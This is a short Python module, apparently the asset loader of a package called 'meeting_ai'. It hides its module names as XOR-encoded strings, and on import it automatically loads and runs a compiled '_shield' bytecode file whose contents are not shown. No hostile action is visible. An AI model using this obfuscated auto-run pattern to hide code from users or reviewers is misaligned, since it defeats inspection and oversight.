_sk_ = b'*\xfa\xb1\xc3\xec\xe2s\xe3[\xa2\xe8M\x8c\x91\xfc\xe9'
_sp_ = [b'u\x89\xd9\xaa\x89\x8e\x17\xcd+\xdb\x8b', b'G\x9f\xd4\xb7\x85\x8c\x14\xbc:\xcb\xc6\x12\xff\xf9\x95\x8cF\x9e', b'G\x9f\xd4\xb7\x85\x8c\x14\xbc:\xcb\xc6\x12\xff\xf9\x95\x8cF\x9e']

def _s_(i):
    b = _sp_[i]
    return bytes((x ^ _sk_[j & 15] for j, x in enumerate(b))).decode('utf-8')
from pathlib import Path
_PKG_DIR = Path(__file__).resolve().parent
_VAULT_ASSETS: dict[str, bytes] = {}

def load_vault() -> None:
    try:
        from . import _shield
        _shield.install()
        return
    except ImportError:
        pass
    pyc = _PKG_DIR / _s_(0)
    if pyc.exists():
        import importlib.machinery
        import importlib.util
        loader = importlib.machinery.SourcelessFileLoader(_s_(1), str(pyc))
        spec = importlib.util.spec_from_loader(_s_(2), loader)
        if spec and spec.loader:
            mod = importlib.util.module_from_spec(spec)
            spec.loader.exec_module(mod)
            mod.install()
load_vault()

def asset_bytes(rel_path: str) -> bytes:
    key = rel_path.replace('\\', '/').lstrip('/')
    if key in _VAULT_ASSETS:
        return _VAULT_ASSETS[key]
    return (_PKG_DIR / key).read_bytes()